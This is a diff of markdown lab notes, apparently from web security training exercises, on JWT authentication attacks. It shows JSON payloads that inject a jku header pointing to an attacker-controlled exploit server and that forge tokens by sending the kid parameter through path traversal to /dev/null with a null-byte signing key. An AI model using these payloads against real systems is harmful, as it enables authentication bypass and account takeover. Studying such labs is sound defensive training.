@@ -56,7 +56,7 @@ Note: JWK Sets like this are sometimes exposed publicly via a standard endpoint,
     ]
 }
 ```
-5. Upaload kid and create jku parameter
+5. Upload kid and create jku parameter
 ```bash
 {
     "kid": "ae125b7c-41a1-44de-9564-6616f85e259b",
@@ -64,4 +64,22 @@ Note: JWK Sets like this are sometimes exposed publicly via a standard endpoint,
     "jku": "https://exploit-0a0d0018034482a8838c047301c20056.exploit-server.net/exploit"
 }
 ```
-7. Finally I had to upload signature
+6. Finally I had to upload signature
+## Injecting self-signed JWTs via the kid parameter
+1. Create a random Symmetric Key
+2. Upload "k" paramater for a null bytes in base64 (AA==)
+```bash
+{
+    "kty": "oct",
+    "kid": "6ea917a4-a32d-4b16-abd2-812fa49cdcde",
+    "k": "AA=="
+}
+```
+5. Upload kid
+```bash
+{
+    "kid": "../../../../../../../../../../../../dev/null",
+    "alg": "HS256"
+}
+```
+6. Finally I had to upload signature
